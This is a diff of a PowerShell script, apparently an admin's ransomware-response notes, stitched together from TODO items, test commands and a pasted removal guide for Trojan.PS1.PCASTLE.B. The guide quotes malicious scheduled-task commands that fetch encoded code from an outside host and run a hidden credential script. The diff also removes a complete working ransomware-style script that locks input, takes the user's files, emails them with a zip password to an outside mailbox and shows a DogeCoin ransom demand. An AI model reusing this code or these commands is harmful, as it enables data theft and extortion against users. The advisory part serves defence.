@@ -37,16 +37,101 @@ TO DO
 5- Audit Event 4665 / 4663
 
 6-other toughts
+
+
 #>
 
+
+
 Set-ExecutionPolicy Bypass c:\scripts\A.ps1 -RunType $true -Path c:\Scripts
+
+
 Test-NetConnection exypmospba01-55.99TB -port 5985
+
+
 Test-NetConnection exypmospba02-66.45TB -port 5985
+                
 Start-Process -FilePath "code.exe" -ArgumentList D:\Desktop\file.txt;
+
 Start-Process -FilePath "file2.exe" -ArgumentList "`"file with spaces.txt`"";
+
 Get-Process code | Set-Window -X 0 -Y 0 -Width 1400 -Height 1049;
 
 # 1-Enable / Check Syman tec Antivirus is running
+
+#.SYNOPSIS scanning for Ransonware
+
+#1-Enable / Check Symantec Antivirus is running 2-Update SEP Definitions 3-Ensure the Server has the latest Windows Security Bundle / Patch (Mar 2020) 4-Disable all the Local Admin Account / Domain Admin Acc (not possible on Domain Controllers) 5- Audit Event 4665 / 4663 6-other toughts
+
+#SOLUTION Minimum Scan Engine: xxx
+#PATTERN Date: 01 Apr 2020
+
+#Step 1
+
+#Before doing any scans, Windows 7, Windows 8, Windows 8.1, and Windows 10, Windowd Server 2012, Windowd server 2016, users must disable System Restore to allow full scanning of their computers.
+
+#Step 2
+
+#Note that not all files, folders, and registry keys and entries are installed on your computer during this malware's/spyware's/grayware's execution. This may be due to incomplete installation or other operating system conditions. If you do not find the same files/folders/registry information, please proceed to the next step.
+
+#Step 3
+
+#Identify and terminate files detected as Trojan.PS1.PCASTLE.B [ Learn More ]
+
+#Windows Task Manager may not display all running processes. In this case, please use a third-party process viewer, preferably Process Explorer, to terminate the malware/grayware/spyware file. You may download the said tool here.
+#If the detected file is displayed in either Windows Task Manager or Process Explorer but you cannot delete it, restart your computer in safe mode. To do this, refer to this link for the complete steps.
+#If the detected file is not displayed in either Windows Task Manager or Process Explorer, continue doing the next steps.
+
+#Step 4
+
+#Deleting Scheduled Tasks
+
+#The following {Task Name} - {Task to be run} listed should be used in the steps identified below:
+
+\Microsoft\windows\{MAC Address} - powershell -nop -ep bypass -e [malicious code from http://v.y6h.net/g?h{date of infection in the format 'yyMMdd'}]
+{MAC Address} - powershell -nop -ep bypass -e [malicious code from http://v.y6h.net/g?l{date of infection in the format 'yyMMdd'}]
+Credentials - powershell -nop -w hidden -ep bypass -f %Application Data%\Microsoft\cred.ps1
+\Microsoft\Windows\{random 4-8 characters} - %AppDataLocal%\{random 4-8 characters}.exe
+{random 4-8 characters} - %AppDataLocal%\run.vbs
+\Microsoft\windows\Bluetooths - powershell -nop -ep bypass -e {base64-encoded command}
+
+For Windows 2000, Windows XP, and Windows Server 2003:
+
+<#Open the Windows Scheduled Tasks. Click Start>Programs>Accessories>
+System Tools>Scheduled Tasks.
+Locate each {Task Name} values listed above in the Name column.
+Right-click on the said file(s) with the aforementioned value.
+Click on Properties. In the Run field, check for the listed {Task to be run}.
+If the strings match the list above, delete the task. 
+
+For Windows Vista, Windows 7, Windows Server 2008, Windows 8, Windows 8.1, and Windows Server 2012:
+
+Open the Windows Task Scheduler. To do this:
+• On Windows Vista, Windows 7, and Windows Server 2008, click Start, type taskschd.msc in the Search input field, then press Enter.
+• On Windows 8, Windows 8.1, and Windows Server 2012, right-click on the lower left corner of the screen, click Run, type taskschd.msc, then press Enter.
+In the left panel, click Task Scheduler Library.
+In the upper-middle panel, locate each {Task Name} values listed above in the Name column.
+In the lower-middle panel, click the Actions tab. In the Details column, check for the {Task to be run} string.
+If the said string is found, delete the task.
+#>
+
+#Step 5
+
+#Search and delete these files [ Learn More ] There may be some files that are hidden. Please make sure you check the Search Hidden Files and Folders checkbox in the "More advanced options" option to include all hidden files and folders in the search result.
+
+%AppDataLocal%\kkk1.log
+%AppDataLocal%\pp2.log
+%AppDataLocal%\333.log
+%AppDataLocal%\kk4.log
+%AppDataLocal%\kk5.log
+%AppDataLocal%\mn.exe
+%AppDataLocal%\{random 4-8 characters}.exe
+%AppDataLocal%\run.vbs
+%AppDataLocal%\ddd.exe
+%Application Data%\sign.txt
+%Application Data%\flashplayer.tmp
+%Application Data%\Microsoft\cred.ps1
+%User Startup%\FlashPlayer.lnk
 
 #2-Update SEP Definitions
 
@@ -55,117 +140,11 @@ Get-Process code | Set-Window -X 0 -Y 0 -Width 1400 -Height 1049;
 #4-Disable all the Local Admin Account / Domain Admin Acc (not possible on Domain Controllers)
 
 #5- Audit Event 4665 / 4663
+
+# Step 6
 <#
 
-#Temporarily disable user mouse and keyboard input
-$code = @"
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-"@
-
-$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
-$userInput::BlockInput($true)
-
-#Install 7zip to zip files
-$workdir = "c:\installer\"
-
-If (Test-Path -Path $workdir -PathType Container)
-{ Write-Host "$workdir already exists" -ForegroundColor Red}
-ELSE
-{ New-Item -Path $workdir  -ItemType directory }
-
-#Download the installer
-$source = "http://www.7-zip.org/a/7z1604-x64.msi"
-$destination = "$workdir\7-Zip.msi"
-
-
-if (Get-Command 'Invoke-Webrequest')
-{
-     Invoke-WebRequest $source -OutFile $destination
-}
-else
-{
-    $WebClient = New-Object System.Net.WebClient
-    $webclient.DownloadFile($source, $destination)
-}
-
-Invoke-WebRequest $source -OutFile $destination 
-
-#Start the installation
-msiexec.exe /i "$workdir\7-Zip.msi" /qb
-
-#Wait a few Seconds for the installation to finish
-Start-Sleep -s 10
-
-#Remove the installer
-rm -Force $workdir\7*
-
-#Set source and destination of files to copy and store
-$Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
-$Destination = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles"
-
-#Copy all files with certain extension and delete them in the source location
-$cp = robocopy /mov $Source $Destination *.txt /s
-
-#Generate a random 8 character password
-[Reflection.Assembly]::LoadWithPartialName("System.Web")
-$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
-
-#Set source for 7zip exe (usually the same path in most basic computers)
-$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
-
-#Zip destination folder with the random password previously generated
-$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
-$windowStyle = "Normal"
-$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
-
-#Delete the destination folder
-$del = Remove-Item $Destination -Force -Recurse
-
-$email = "8ng3vm+bbvhtmmj122ho@pokemail.net"
-
-#Send password for files to your e-mail
-$SMTPServer = "smtp.pokemail.net"
-$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
-$From = $email
-$To = $email
-$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
-$Body =  $randomPassword
-$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
-$Msg.IsBodyHTML = $False
-$Mailer.send($Msg)
-$Msg.Dispose()
-$Mailer.Dispose()
-
-#Send zip folder to your e-mail
-$ZipFolder = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles.zip"
-$SMTPServer = "smtp.pokemail.net"
-$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
-$From = $email
-$To = $email
-$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
-$Body = "Zip Attached"
-$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
-$Msg.IsBodyHTML = $False
-$Attachment = new-object Net.Mail.Attachment($ZipFolder)
-$Msg.attachments.add($Attachment)
-$Mailer.send($Msg)
-$Attachment.Dispose()
-$Msg.Dispose()
-$Mailer.Dispose()
-
-#Delete the zip file created
-$del = Remove-Item $ZipFolder -Force -Recurse
-
-#Disable temporary user keyboard and mouse input block
-$userInput::BlockInput($false)
-
-#Display a message demanding money
-#Add the required .NET assembly for message display
-Add-Type -AssemblyName System.Windows.Forms
-
-#Show the message
-$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
-
+Scan your computer with your Trend Micro product to delete files detected as Trojan.PS1.PCASTLE.B. If the detected files have already been cleaned, deleted, or quarantined by your Antivirus  product, no further step is required. You may opt to simply delete the quarantined files. Please check the following Trend Micro Support pages for more information
 
 #>
+End 
